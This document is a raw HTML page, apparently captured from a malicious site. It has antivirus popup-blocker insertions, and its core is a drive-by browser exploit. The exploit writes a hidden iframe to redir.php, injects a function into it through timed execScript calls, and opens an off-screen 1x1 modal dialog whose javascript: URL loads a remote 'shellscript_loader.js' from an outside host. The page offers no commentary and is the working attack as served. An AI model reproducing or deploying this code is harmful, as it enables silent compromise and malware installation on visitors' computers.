<html>
<body>


<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

var SymRealWinOpen = window.open;

function SymWinOpen(url, name, attributes)
{
  return (new Object());
}

window.open = SymWinOpen;

//-->
</script>

<script language="Javascript">

    function InjectedDuringRedirection(){
	    �showModalDialog('md.htm',window,"dialogTop:-10000\;dialogLeft:-10000\;dialogHeight:1\;dialogWidth:1\;").location="javascript:'<SCRIPT SRC=\\'http://bdsm.fihorn.pong.xxx-goto.net/loader/e/md/shellscript_loader.js\\'><\/script>'";
    }
    
</script>

<script language="javascript">
    
    setTimeout("myiframe.execScript(InjectedDuringRedirection.toString())",1000);
    setTimeout("myiframe.execScript('InjectedDuringRedirection()') ",1001);
    document.write('<IFRAME ID=myiframe NAME=myiframe SRC="redir.php" WIDTH=200 HEIGHT=200></IFRAME>');
    
</script>

</body>
</html>

<script language="JavaScript">
<!--
var SymRealOnLoad;
var SymRealOnUnload;

function SymOnUnload()
{
  window.open = SymWinOpen;
  if(SymRealOnUnload != null)
     SymRealOnUnload();
}

function SymOnLoad()
{
  if(SymRealOnLoad != null)
     SymRealOnLoad();
  window.open = SymRealWinOpen;
  SymRealOnUnload = window.onunload;
  window.onunload = SymOnUnload;
}

SymRealOnLoad = window.onload;
window.onload = SymOnLoad;

//-->
</script>

